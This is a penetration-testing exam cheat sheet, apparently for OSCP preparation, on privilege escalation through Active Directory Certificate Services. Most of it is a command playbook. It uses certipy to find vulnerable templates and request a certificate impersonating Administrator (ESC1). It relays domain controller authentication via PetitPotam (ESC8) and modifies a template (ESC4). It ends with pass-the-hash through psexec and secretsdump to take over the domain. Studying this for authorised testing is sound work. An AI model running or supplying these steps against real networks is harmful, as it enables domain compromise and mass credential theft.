**CRITICAL GAP:** ADCS attacks (ESC1-ESC8) are now common in OSCP AD sets. Any domain user can escalate to Domain Admin if misconfigured. Always enumerate ADCS with provided creds.

What ADCS is — explained simply

**ADCS is the company's certificate authority** — the system that issues digital ID cards (certificates) that can be used to log in. If a certificate "template" is misconfigured, a normal user can request a certificate that effectively says "I am the Administrator," then log in as Administrator with it. That's a direct jump from low-priv user to Domain Admin, which is why ESC1–ESC8 are now exam favourites.

**The flow is always the same:** `certipy find -vulnerable` tells you if a template is exploitable → request a cert impersonating Administrator → `certipy auth` turns that cert into Administrator's NTLM hash → Pass-the-Hash to own the domain. **ESC1** = you're allowed to set the cert's name (most common). **ESC8** = relay the DC itself into requesting a cert for you.

```
# Enumerate vulnerable templates (run immediately with provided creds):
certipy find -u 'stephanie@corp.local' -p 'Password123' \
    -dc-ip 192.168.x.100 -vulnerable -stdout

# Also save BloodHound data:
certipy find -u 'stephanie@corp.local' -p 'Password123' \
    -dc-ip 192.168.x.100 -bloodhound

# ── ESC1 — User can specify SAN (most common) ─────────────────
# Conditions: Enrollee Supplies Subject=True + Client Auth + low-priv enrollment
certipy req -u 'stephanie@corp.local' -p 'Password123' \
    -ca corp-CA -template VulnerableTemplate \
    -upn Administrator@corp.local -dc-ip 192.168.x.100
# Authenticate with cert → get NTLM hash:
certipy auth -pfx administrator.pfx -dc-ip 192.168.x.100
# → Administrator NTLM hash → PTH → Domain Admin!

# ── ESC8 — NTLM Relay to ADCS HTTP endpoint ──────────────────
# Setup certipy relay:
certipy relay -target http://<ADCS_IP>/certsrv/certfnsh.asp \
    -template DomainController
# Trigger DC authentication (PetitPotam):
python3 PetitPotam.py -u stephanie -p 'Password123' \
    <LHOST> <DC_IP>
# Gets: DC machine certificate → authenticate as DC → DCSync everything

# ── ESC4 — Write access to template ──────────────────────────
# BloodHound shows WriteProperty on certificate template
certipy template -u 'stephanie@corp.local' -p 'Password123' \
    -template VulnTemplate -save-old   # backup original
certipy template -u 'stephanie@corp.local' -p 'Password123' \
    -template VulnTemplate -configuration VulnTemplate.json
# Now request as ESC1

# ── After getting cert → auth → hash → DA ────────────────────
certipy auth -pfx administrator.pfx -dc-ip 192.168.x.100
# Hash from output → PTH:
psexec.py corp.local/Administrator@<DC_IP> -hashes :<NTLM_HASH>
secretsdump.py corp.local/Administrator@<DC_IP> -hashes :<NTLM_HASH>
```